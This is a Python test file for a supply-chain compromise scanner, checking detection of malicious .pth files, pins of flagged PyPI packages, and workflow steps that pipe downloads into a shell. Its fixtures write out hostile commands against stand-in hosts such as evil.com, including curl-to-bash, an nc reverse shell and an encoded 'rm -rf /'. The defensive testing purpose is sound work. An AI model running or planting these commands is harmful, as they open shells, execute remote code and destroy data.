"""Property tests for scripts/detect_compromise.py.

Lock in the bypass-class fixes the bots + subagent caught across PR #44
rounds so a future refactor can't silently re-open them. Each test
constructs a synthetic input that EXACTLY triggers the historical
bypass and asserts the scanner now catches it.

Sources of the bypass classes:
  - Subagent 4cc0bb4 (CRITICAL): MULTILINE missing → line-2+ .pth payload
  - Subagent 4cc0bb4 (CRITICAL): allowlist prefix-only → tampered file
  - Subagent 4cc0bb4 (HIGH): rglob depth → .pth in subdir
  - CodeRabbit + Codex 3fe4154: PEP 508 extras `litellm[proxy]`
  - CodeRabbit 3fe4154: `.yaml` vs `.yml` workflow extension
  - Gemini security-high 3fe4154 + Codex P2: PEP 508 markers, direct refs, comments
  - Gemini security-medium 9a20e14: workflow `python` shell, backtick eval
  - Codex P2 9a20e14: eval with whitespace inside subshell
  - Gemini HIGH 9a20e14: substring-vs-parts exclusion bypass
"""
from __future__ import annotations

import shutil
import sys
import tempfile
import unittest
from pathlib import Path

# Add scripts/ to sys.path so we can import detect_compromise as a module.
_REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_REPO_ROOT / "scripts"))

import detect_compromise as dc  # noqa: E402


class _TempDirTestBase(unittest.TestCase):
    """Base class that auto-cleans tempfile.mkdtemp() between tests.
    Gemini medium on d53c64f noted the previous suite leaked temp
    dirs on every run. ``_mkdtemp()`` returns a Path and registers
    its cleanup via self.addCleanup; ignore_errors=True so a still-
    locked file on Windows doesn't fail the test."""

    def _mkdtemp(self) -> Path:
        p = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, p, ignore_errors=True)
        return p


# ── PTH file scanning ──────────────────────────────────────────────────


class PthMultilineRegexTests(_TempDirTestBase):
    """Lock in the MULTILINE fix from subagent CRITICAL on 4cc0bb4."""

    def _make_venv(self, pth_content: bytes) -> Path:
        """Build an ephemeral venv directory tree with a single .pth file."""
        tmp = self._mkdtemp()
        sp = tmp / "venv" / "Lib" / "site-packages"
        sp.mkdir(parents=True)
        (sp / "attack.pth").write_bytes(pth_content)
        return tmp / "venv"

    def test_payload_on_first_line_caught(self):
        venv = self._make_venv(b"import os; os.system('echo pwn')\n")
        result = dc.check_pth_files_for_exec_code([venv])
        self.assertFalse(result.ok, "line-1 import should still match")

    def test_payload_on_second_line_caught(self):
        """The CRITICAL bypass: legit path line 1 + payload line 2.
        Without MULTILINE, ``^\\s*import`` only matched the very start
        of the bytes object, missing the payload entirely."""
        venv = self._make_venv(
            b"/usr/local/lib/python3.11/site-packages\n"
            b"import os; os.system('curl http://c2.evil.com/payload | sh')\n"
        )
        result = dc.check_pth_files_for_exec_code([venv])
        self.assertFalse(result.ok, "line-2 import must match (MULTILINE)")

    def test_payload_with_exec_caught(self):
        venv = self._make_venv(
            b"/some/legit/path\n"
            b"exec(__import__('base64').b64decode('cm0gLXJmIC8K'))\n"
        )
        result = dc.check_pth_files_for_exec_code([venv])
        self.assertFalse(result.ok)

    def test_payload_with_subprocess_caught(self):
        venv = self._make_venv(b"/x\nsubprocess.run(['nc', '-e', '/bin/sh', 'evil', '1337'])\n")
        result = dc.check_pth_files_for_exec_code([venv])
        self.assertFalse(result.ok)

    def test_payload_in_subdirectory_caught(self):
        """Subagent HIGH on 4cc0bb4: rglob('site-packages/*.pth') only
        matched DIRECT children of site-packages. A payload in a
        sub-package dir was invisible."""
        tmp = self._mkdtemp()
        deep = tmp / "venv" / "Lib" / "site-packages" / "malicious_pkg"
        deep.mkdir(parents=True)
        (deep / "attack.pth").write_bytes(b"import os\nos.system('evil')\n")
        result = dc.check_pth_files_for_exec_code([tmp / "venv"])
        self.assertFalse(result.ok, "subdir .pth must match")

    def test_legitimate_path_only_pth_passes(self):
        """A normal .pth file is just directory paths, no executable code."""
        venv = self._make_venv(b"/path/one\n/path/two\n/path/three\n")
        result = dc.check_pth_files_for_exec_code([venv])
        self.assertTrue(result.ok, "path-only .pth must not false-positive")


class PthAllowlistTamperTests(_TempDirTestBase):
    """Lock in the allowlist exact-match fix from subagent CRITICAL on
    4cc0bb4. The original prefix-only check let a tampered file with
    the known-good magic-bytes prefix + appended payload sail through."""

    def test_legit_distutils_precedence_pth_allowlisted(self):
        tmp = self._mkdtemp()
        f = tmp / "distutils-precedence.pth"
        f.write_bytes(
            b"import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
            b"enabled = os.environ.get(var, 'local') == 'local'; "
            b"enabled and __import__('_distutils_hack').add_shim();"
        )
        self.assertTrue(dc._pth_is_allowlisted(f), "exact-content match")

    def test_tampered_pth_rejected_from_allowlist(self):
        """The bypass: legit prefix + appended exec payload, fits within
        300-byte size limit. Previously slipped through; now rejected."""
        tmp = self._mkdtemp()
        f = tmp / "distutils-precedence.pth"
        f.write_bytes(
            b"import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
            b"os.system('curl http://attacker.example/x')"
        )
        self.assertFalse(
            dc._pth_is_allowlisted(f),
            "tampered file MUST NOT be allowlisted (subagent CRITICAL fix)",
        )

    def test_legit_file_with_trailing_newline_still_allowlisted(self):
        """The allowlist must tolerate harmless whitespace differences
        (a trailing newline from a text editor) — only meaningful
        content changes should fail it."""
        tmp = self._mkdtemp()
        f = tmp / "distutils-precedence.pth"
        f.write_bytes(
            b"import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
            b"enabled = os.environ.get(var, 'local') == 'local'; "
            b"enabled and __import__('_distutils_hack').add_shim();\n"
        )
        self.assertTrue(dc._pth_is_allowlisted(f))


# ── Compromised-PyPI regex ─────────────────────────────────────────────


class CompromisedPyPIRegexTests(_TempDirTestBase):
    """Lock in the PEP 508 form coverage. Across rounds the bots
    found bypasses for: bare name, extras, version specifiers, environment
    markers, direct references, trailing comments."""

    def _scan(self, requirements_content: str) -> dc.CheckResult:
        tmp = self._mkdtemp()
        (tmp / "requirements.txt").write_text(requirements_content)
        return dc.check_compromised_pypi_in_deps(tmp)

    def test_bare_name_caught(self):
        self.assertFalse(self._scan("litellm").ok)

    def test_name_with_extras_caught(self):
        """CodeRabbit + Codex on 3fe4154: extras bypass."""
        self.assertFalse(self._scan("litellm[proxy]").ok)

    def test_name_with_extras_and_version_caught(self):
        self.assertFalse(self._scan("litellm[proxy]==1.30.0").ok)

    def test_version_specifier_caught(self):
        self.assertFalse(self._scan("litellm==1.30.0").ok)

    def test_range_specifier_caught(self):
        self.assertFalse(self._scan("litellm>=1.0,<2.0").ok)

    def test_trailing_comment_caught(self):
        """Gemini MEDIUM on 0e16c8d: trailing-comment bypass."""
        self.assertFalse(self._scan("litellm  # outdated").ok)

    def test_environment_marker_caught(self):
        """Codex P2 on 0e16c8d: PEP 508 environment-marker bypass."""
        self.assertFalse(
            self._scan('litellm; python_version<"3.12"').ok,
        )

    def test_direct_reference_caught(self):
        """Codex P2 on 0e16c8d: PEP 508 direct-reference URL bypass."""
        self.assertFalse(
            self._scan("litellm @ https://example.com/litellm.tar.gz").ok,
        )

    def test_durabletask_caught(self):
        """The other half of the COMPROMISED_PYPI tuple."""
        self.assertFalse(self._scan("durabletask==1.0.0").ok)

    def test_unrelated_package_not_flagged(self):
        """Verify we don't false-positive on a package that just
        STARTS with the same letters."""
        result = self._scan("litellm-replacement==1.0.0\nlitellm-mock==0.1.0\n")
        # neither line is bare 'litellm' followed by [/=/etc/;/@/#/EOL
        self.assertTrue(
            result.ok,
            "'litellm-replacement' must not match the 'litellm' pattern",
        )

    def test_whitespace_before_extras_caught(self):
        """Gemini medium on d53c64f: PEP 508 allows whitespace between
        the package name and the extras bracket. ``litellm [proxy]``
        is legal and must match."""
        self.assertFalse(self._scan("litellm [proxy]==1.30.0").ok)
        self.assertFalse(self._scan("litellm   [proxy,extra]==1.30.0").ok)


class CompromisedPyPIExcludePathsTests(_TempDirTestBase):
    """Lock in the path-parts (not substring) exclusion from Gemini HIGH
    on 9a20e14."""

    def test_legitimate_dir_with_venv_substring_scanned(self):
        """A user project dir named ``my-venv-project/`` would be
        wrongly excluded by the prior substring matcher. It must be
        scanned now."""
        tmp = self._mkdtemp()
        legit_dir = tmp / "my-venv-project"
        legit_dir.mkdir()
        (legit_dir / "requirements.txt").write_text("litellm==1.0.0")
        # Scan from a parent root so the file IS discovered, but with
        # the matcher we've installed.
        result = dc.check_compromised_pypi_in_deps(tmp)
        self.assertFalse(
            result.ok,
            "requirements.txt in my-venv-project/ must be scanned",
        )

    def test_requirements_dist_txt_scanned(self):
        """A file named ``requirements-dist.txt`` would be wrongly
        excluded by the prior substring matcher (matched "dist/")."""
        tmp = self._mkdtemp()
        (tmp / "requirements-dist.txt").write_text("litellm==1.0.0")
        result = dc.check_compromised_pypi_in_deps(tmp)
        self.assertFalse(result.ok, "requirements-dist.txt must be scanned")

    def test_real_venv_excluded(self):
        """A real venv site-packages requirements.txt must NOT be
        scanned (would always false-positive on a venv with the
        compromised package legitimately installed-pre-discovery)."""
        tmp = self._mkdtemp()
        venv_sp = tmp / "venv" / "Lib" / "site-packages"
        venv_sp.mkdir(parents=True)
        (venv_sp / "requirements.txt").write_text("litellm==1.0.0")
        result = dc.check_compromised_pypi_in_deps(tmp)
        # Should be OK because the file is inside an excluded dir.
        self.assertTrue(
            result.ok,
            "venv/Lib/site-packages/requirements.txt must be excluded",
        )


# ── Workflow .yml + .yaml + pattern coverage ───────────────────────────


class WorkflowScanCoverageTests(_TempDirTestBase):
    """Lock in the .yaml extension fix (CodeRabbit on 3fe4154) and the
    broadened pattern set (Gemini security-medium on 9a20e14)."""

    def _make_repo(self, workflows: dict[str, str]) -> Path:
        tmp = self._mkdtemp()
        wf_dir = tmp / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        for name, body in workflows.items():
            (wf_dir / name).write_text(body)
        return tmp

    def test_curl_pipe_bash_caught_in_yml(self):
        repo = self._make_repo({
            "x.yml": "name: x\non: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n"
                     "    steps:\n      - run: curl https://evil.com/x.sh | bash\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertFalse(result.ok)

    def test_curl_pipe_bash_caught_in_yaml(self):
        """`.yaml` extension was a bypass on 3fe4154."""
        repo = self._make_repo({
            "x.yaml": "name: x\non: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n"
                     "    steps:\n      - run: curl https://evil.com/x.sh | bash\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertFalse(result.ok, ".yaml extension must be scanned")

    def test_sudo_prefix_caught(self):
        repo = self._make_repo({
            "x.yml": "run: curl https://evil.com/x.sh | sudo bash\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertFalse(result.ok)

    def test_python_pipe_caught(self):
        """Gemini security-medium on 9a20e14: multi-stage payloads use
        ``curl ... | python -``."""
        repo = self._make_repo({
            "x.yml": "run: curl https://evil.com/payload.py | python -\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertFalse(result.ok, "python pipe-target must be caught")

    def test_process_substitution_caught(self):
        repo = self._make_repo({
            "x.yml": "run: bash <(curl https://evil.com/x.sh)\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertFalse(result.ok)

    def test_eval_subshell_with_whitespace_caught(self):
        """Codex P2 on ba11712: ``eval $( curl ...)`` (space after $()
        was a bypass."""
        repo = self._make_repo({
            "x.yml": "run: eval $( curl -fsSL https://evil.com )\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertFalse(result.ok, "eval with whitespace must be caught")

    def test_eval_backtick_caught(self):
        repo = self._make_repo({
            "x.yml": "run: eval `curl https://evil.com`\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertFalse(result.ok)

    def test_benign_curl_not_flagged(self):
        """Negative case — a legitimate curl-to-file or curl-to-stdout
        without piping to a shell must not flag."""
        repo = self._make_repo({
            "x.yml": "run: curl -o data.json https://example.com/data.json\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertTrue(result.ok, "non-shell curl must NOT false-positive")

    def test_absolute_path_shell_caught(self):
        """Gemini security-medium on 03d05e5: attackers commonly use
        absolute paths (``/bin/bash``, ``/usr/bin/python3``) to bypass
        simple shell-name filters."""
        repo = self._make_repo({
            "x.yml": "run: curl https://evil.com/x.sh | /bin/bash\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertFalse(result.ok, "absolute-path shell must be caught")

    def test_sudo_with_absolute_path_caught(self):
        """``/usr/bin/sudo bash`` and ``sudo /bin/bash`` are both legal
        invocations — both must trip the pattern."""
        repo1 = self._make_repo({
            "x.yml": "run: curl https://evil.com/x.sh | /usr/bin/sudo bash\n",
        })
        self.assertFalse(
            dc.check_workflows_for_suspicious_commits(repo1).ok,
        )
        repo2 = self._make_repo({
            "x.yml": "run: curl https://evil.com/x.sh | sudo /bin/bash\n",
        })
        self.assertFalse(
            dc.check_workflows_for_suspicious_commits(repo2).ok,
        )

    def test_python_version_suffix_caught(self):
        """``python3.11`` is a real invocation form — must match
        despite the trailing version digits."""
        repo = self._make_repo({
            "x.yml": "run: curl https://evil.com/x.py | /usr/bin/python3.11\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertFalse(result.ok)

    def test_eval_backtick_with_whitespace_caught(self):
        """Gemini security-medium on 03d05e5: `` `\\s+curl ...\\s+` `` —
        whitespace tolerance inside backticks."""
        repo = self._make_repo({
            "x.yml": "run: eval ` curl https://evil.com `\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertFalse(result.ok)

    def test_actions_uses_not_flagged(self):
        """Negative case — a normal ``actions/checkout@v4`` line uses
        the ``/`` character that's in our path-prefix pattern. Must
        NOT trip the pattern."""
        repo = self._make_repo({
            "x.yml": "run: actions/checkout@v4\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertTrue(result.ok)

    def test_sudo_with_flags_caught(self):
        """Gemini medium on d53c64f: ``sudo -E bash`` /
        ``sudo -u root bash`` are common malicious payload forms.
        The sudo group now accepts trailing flag chains."""
        repo1 = self._make_repo({
            "x.yml": "run: curl https://evil.com/x.sh | sudo -E bash\n",
        })
        self.assertFalse(
            dc.check_workflows_for_suspicious_commits(repo1).ok,
            "sudo -E bash must be caught",
        )
        repo2 = self._make_repo({
            "x.yml": "run: curl https://evil.com/x.sh | sudo -E -H -u root /bin/bash\n",
        })
        self.assertFalse(
            dc.check_workflows_for_suspicious_commits(repo2).ok,
            "sudo with multiple flags + abs-path must be caught",
        )


if __name__ == "__main__":
    unittest.main()
